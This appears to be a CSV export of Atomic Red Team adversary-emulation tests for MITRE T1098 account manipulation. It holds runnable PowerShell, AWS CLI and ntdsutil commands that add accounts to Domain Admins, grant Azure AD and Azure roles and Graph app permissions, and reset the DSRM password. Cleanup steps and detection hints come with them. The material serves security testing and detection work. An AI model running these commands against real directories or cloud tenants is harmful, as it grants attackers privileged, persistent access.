T1098,Account Manipulation,Domain Account and Group Manipulate,a55a22e9-a3d3-42ce-bd48-2653adb8f7a9,"Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). 

The quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,
you need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to 
create the user and alter the group. Automatic installation of the dependency requires an elevated session, 
and is unlikely to work with Powershell Core (untested).

If you consider running this test against a production Active Directory, the good practise is to create a dedicated
service account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated
as group manager of the target group.

Example: `Invoke-AtomicTest -Session $session 'T1098' -TestNames ""Domain Account and Group Manipulate"" -InputArgs @{""group"" = ""DNSAdmins"" }`
",windows,,,"$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = ""#{account_prefix}-$x$y$z""
New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember ""#{group}"" $account
",powershell,,,"Get-ADUser -LDAPFilter ""(&(samaccountname=#{account_prefix}-*)(givenName=Test))"" | Remove-ADUser -Confirm:$False
",,"dependencies.0.description: PS Module ActiveDirectory

dependencies.0.prereq_command: Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
}

dependencies.0.get_prereq_command: if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}

","input_arguments.account_prefix.description: Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on
a match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful.


input_arguments.account_prefix.type: string

input_arguments.account_prefix.default: atr-

input_arguments.group.description: Name of the group to alter

input_arguments.group.type: string

input_arguments.group.default: Domain Admins

input_arguments.create_args.description: Additional string appended to New-ADUser call

input_arguments.create_args.type: string

input_arguments.create_args.default: 

"
T1098,Account Manipulation,AWS - Create a group and add a user to that group,8822c3b0-d9f9-4daf-a043-49f110a31122,"Adversaries create AWS group, add users to specific to that group to elevate their privilieges to gain more accesss
",iaas:aws,,,"aws iam create-group --group-name #{username}
aws iam add-user-to-group --user-name #{username} --group-name #{username}
",sh,,,"aws iam remove-user-from-group --user-name #{username} --group-name #{username}
aws iam delete-group --group-name #{username}
",,"dependencies.0.description: Check if the user exists, we can only add a user to a group if the user exists.

dependencies.0.prereq_command: aws iam list-users | grep #{username}

dependencies.0.get_prereq_command: echo Please run atomic test T1136.003, before running this atomic test

","input_arguments.username.description: Name of the AWS group to create

input_arguments.username.type: string

input_arguments.username.default: atomicredteam

"
T1098,Account Manipulation,Azure AD - adding user to Azure AD role,0e65ae27-5385-46b4-98ac-607a8ee82261,"The adversaries want to add user to some Azure AD role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, 
Privileged Authentication Administrator (this role can reset Global Administrator password!).
By default, the role Global Reader is assigned to the user principal in this test.

The account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.

Detection hint - check Activity ""Add member to role"" in Azure AD Audit Logs. In targer you will also see User as a type.
",azure-ad,,,"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$user = Get-AzureADUser -Filter ""DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'""
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
Write-Host ""User $($user.DisplayName) was added to $($role.DisplayName) role""
",powershell,False,,"Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$user = Get-AzureADUser -Filter ""DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'""
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
Write-Host ""User $($user.DisplayName) was removed from $($role.DisplayName) role""
",,"dependencies.0.description: AzureAD module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.user_principal_name.description: Display Name, or User Principal Name, of the targeted user principal

input_arguments.user_principal_name.type: string

input_arguments.user_principal_name.default: SuperUser

input_arguments.role_name.description: Name of the targeted Azure AD role

input_arguments.role_name.type: string

input_arguments.role_name.default: Global Reader

"
T1098,Account Manipulation,Azure AD - adding service principal to Azure AD role,92c40b3f-c406-4d1f-8d2b-c039bf5009e4,"The adversaries want to add service principal to some Azure AD role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, 
Privileged Authentication Administrator (this role can reset Global Administrator password!).
By default, the role Global Reader is assigned to service principal in this test.

The account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.

Detection hint - check Activity ""Add member to role"" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.
",azure-ad,,,"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$sp = Get-AzureADServicePrincipal -Filter ""DisplayName eq '#{service_principal_name}'""
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId
Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.DisplayName)""
",powershell,False,,"Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$sp = Get-AzureADServicePrincipal -Filter ""DisplayName eq '#{service_principal_name}'""
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId
Write-Host ""Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role""
",,"dependencies.0.description: AzureAD module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.service_principal_name.description: Name of the service principal

input_arguments.service_principal_name.type: string

input_arguments.service_principal_name.default: SuperSP

input_arguments.role_name.description: Name of the targeted Azure AD role

input_arguments.role_name.type: string

input_arguments.role_name.default: Global Reader

"
T1098,Account Manipulation,Azure - adding user to Azure role in subscription,1a94b3fc-b080-450a-b3d8-6d9b57b472ea,"The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Owner, Contributor.
By default, the role Reader is assigned to user in this test.

New-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.

The account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write 
(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All 
and Microsoft Graph Directory.Read.All permissions.

Detection hint - check Operation Name ""Create role assignment"" in subscriptions Activity Logs.
",iaas:azure,,,"Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential

$user = Get-AzADUser | where-object {$_.DisplayName -eq ""#{user_principal_name}"" -or $_.UserPrincipalName -eq ""#{user_principal_name}"" }
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""}
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""
",powershell,False,,"Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore

$user = Get-AzADUser | where-object {$_.DisplayName -eq ""#{user_principal_name}"" -or $_.UserPrincipalName -eq ""#{user_principal_name}"" }
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""}
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)""
",,"dependencies.0.description: Az.Resources module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name Az.Resources -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.user_principal_name.description: Display Name, or User Principal Name, of the targeted user principal

input_arguments.user_principal_name.type: string

input_arguments.user_principal_name.default: SuperUser

input_arguments.role_name.description: Name of the targeted Azure role

input_arguments.role_name.type: string

input_arguments.role_name.default: Reader

input_arguments.subscription.description: Name of the targeted subscription

input_arguments.subscription.type: string

input_arguments.subscription.default: Azure subscription 1

"
T1098,Account Manipulation,Azure - adding service principal to Azure role in subscription,c8f4bc29-a151-48da-b3be-4680af56f404,"The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Owner, Contributor.
By default, the role Reader is assigned to service principal in this test.

New-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.

The account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write 
(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All 
and Microsoft Graph Directory.Read.All permissions.

Detection hint - check Operation Name ""Create role assignment"" in subscriptions Activity Logs.
",iaas:azure,,,"Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential

$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq ""#{service_principal_name}""}
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""} 
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""
",powershell,False,,"Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore

$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq ""#{service_principal_name}""}
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""} 
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)""
",,"dependencies.0.description: Az.Resources module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name Az.Resources -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.service_principal_name.description: Name of the service principal

input_arguments.service_principal_name.type: string

input_arguments.service_principal_name.default: SuperSP

input_arguments.role_name.description: Name of the targeted Azure role

input_arguments.role_name.type: string

input_arguments.role_name.default: Reader

input_arguments.subscription.description: Name of the targeted subscription

input_arguments.subscription.type: string

input_arguments.subscription.default: Azure subscription 1

"
T1098,Account Manipulation,Azure AD - adding permission to application,94ea9cc3-81f9-4111-8dde-3fb54f36af4b,"The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.
This technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: ""Get-AzureADApplication"" instead of ""New-AzureADServicePrincipal"".
The DirectoryRecommendations.Read.All permissions has been selected as the default.

The account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.

Detection hint - check Operation Name ""Add app role assignment to service principal"" in subscriptions Activity Logs.
You can also take a look at the materials:
https://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/
https://github.com/reprise99/Sentinel-Queries
https://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766
https://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb
",azure-ad,,,"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = New-AzureADApplication -DisplayName ""#{application_name}""
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId
#$aadApplication = Get-AzureADApplication -Filter ""DisplayName eq '#{application_name}'""

#Get Service Principal of Microsoft Graph Resource API 
$graphSP = Get-AzureADServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""

#Initialize RequiredResourceAccess for Microsoft Graph Resource API 
$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]

#Set Application Permissions
$ApplicationPermissions = @('#{application_permission}')

$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = ""Role""
$resourceAccess.Id = $reqPermission.Id    
#Add required app permission
$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host ""App permission $permission not found in the Graph Resource API"" -ForegroundColor Red
}

#Add required resource accesses
$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)

#Set permissions in existing Azure AD App
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess

$servicePrincipal = Get-AzureADServicePrincipal -Filter ""AppId eq '$($aadApplication.AppId)'""

New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id
",powershell,False,,"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = @(Get-AzureADApplication -Filter ""DisplayName eq '#{application_name}'"")
If ($aadApplication.Count -eq 0)
{
  Write-Host ""App not found: cannot delete it""
  exit
}
ElseIf ($aadApplication.Count -gt 1)
{
  Write-Host ""Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.""
  exit
}
Else
{
  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId
  Write-Host ""Successfully deleted app""
}
",,"dependencies.0.description: AzureAD module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.application_name.description: Name of the targeted application that will be created

input_arguments.application_name.type: string

input_arguments.application_name.default: test_app

input_arguments.application_permission.description: Permission from Microsoft Graph Resource API that will be added to application

input_arguments.application_permission.type: string

input_arguments.application_permission.default: DirectoryRecommendations.Read.All

"
T1098,Account Manipulation,Password Change on Directory Service Restore Mode (DSRM) Account,d5b886d9-d1c7-4b6e-a7b0-460041bf2823,"Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account
",windows,,,"ntdsutil ""set dsrm password"" ""sync from domain account #{sync_account}"" ""q"" ""q""
",command_prompt,True,,,,,"input_arguments.sync_account.description: Account to sync password from

input_arguments.sync_account.type: string

input_arguments.sync_account.default: %username%

"
T1098,Account Manipulation,Domain Password Policy Check: Short Password,fc5f9414-bd67-4f5f-a08e-e5381e29cbd1,"Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.
If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the atomic manually and specify a new password of your choosing, however the
password policy will likely prevent you from setting the password back to what it was.
",windows,,,"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",powershell,,,,,"dependencies.0.description: Password for current user must be stored in a credential file

dependencies.0.prereq_command: if (Test-Path #{cred_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cred_file}"") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message ""Enter password for $env:USERNAME to use during password change attempt""
$cred.Password | ConvertFrom-SecureString | Out-File ""#{cred_file}""

","input_arguments.new_password.description: The password to set for the current domain user (default value is 7 characters)

input_arguments.new_password.type: string

input_arguments.new_password.default: Uplow-1

input_arguments.cred_file.description: A file containing the password of the current user

input_arguments.cred_file.type: path

input_arguments.cred_file.default: $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt

"
T1098,Account Manipulation,Domain Password Policy Check: No Number in Password,68190529-069b-4ffc-a942-919704158065,"Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.
If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the
password policy will likely prevent you from setting the password back to what it was. 
",windows,,,"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",powershell,,,,,"dependencies.0.description: Password for current user must be stored in a credential file

dependencies.0.prereq_command: if (Test-Path #{cred_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cred_file}"") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message ""Enter password for $env:USERNAME to use during password change attempt""
$cred.Password | ConvertFrom-SecureString | Out-File ""#{cred_file}""

","input_arguments.new_password.description: The password to set for the current domain user (default is long and has upper and lower case and special character but no number)

input_arguments.new_password.type: string

input_arguments.new_password.default: UpperLowerLong-special

input_arguments.cred_file.description: A file containing the password of the current user

input_arguments.cred_file.type: path

input_arguments.cred_file.default: $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt

"
T1098,Account Manipulation,Domain Password Policy Check: No Special Character in Password,7d984ef2-2db2-4cec-b090-e637e1698f61,"Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.
If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the
password policy will likely prevent you from setting the password back to what it was. 
",windows,,,"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",powershell,,,,,"dependencies.0.description: Password for current user must be stored in a credential file

dependencies.0.prereq_command: if (Test-Path #{cred_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cred_file}"") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message ""Enter password for $env:USERNAME to use during password change attempt""
$cred.Password | ConvertFrom-SecureString | Out-File ""#{cred_file}""

","input_arguments.new_password.description: The password to set for the current domain user (default is long and has upper and lower case and number but no special character)

input_arguments.new_password.type: string

input_arguments.new_password.default: UpperLowerLong333noSpecialChar

input_arguments.cred_file.description: A file containing the password of the current user

input_arguments.cred_file.type: path

input_arguments.cred_file.default: $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt

"
T1098,Account Manipulation,Domain Password Policy Check: No Uppercase Character in Password,b299c120-44a7-4d68-b8e2-8ba5a28511ec,"Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.
If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the
password policy will likely prevent you from setting the password back to what it was. 
",windows,,,"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",powershell,,,,,"dependencies.0.description: Password for current user must be stored in a credential file

dependencies.0.prereq_command: if (Test-Path #{cred_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cred_file}"") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message ""Enter password for $env:USERNAME to use during password change attempt""
$cred.Password | ConvertFrom-SecureString | Out-File ""#{cred_file}""

","input_arguments.new_password.description: The password to set for the current domain user (default is long and has and lower case and special character and number but no uppercase)

input_arguments.new_password.type: string

input_arguments.new_password.default: lower-long-special-333

input_arguments.cred_file.description: A file containing the password of the current user

input_arguments.cred_file.type: path

input_arguments.cred_file.default: $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt

"
T1098,Account Manipulation,Domain Password Policy Check: No Lowercase Character in Password,945da11e-977e-4dab-85d2-f394d03c5887,"Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.
